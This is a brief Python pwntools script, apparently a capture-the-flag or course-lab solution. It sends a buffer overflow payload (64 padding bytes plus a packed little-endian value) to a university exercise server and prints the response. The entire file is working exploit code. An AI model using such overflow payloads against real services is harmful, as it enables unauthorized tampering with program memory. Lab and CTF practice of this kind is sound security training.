import struct
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23152

s = remote(SERVER, PORT, timeout=9999)

# payload with little-endian format
payload = b"A" * 64 + struct.pack('<I', 0x61626364)

s.sendline(payload)

print(s.recvall())
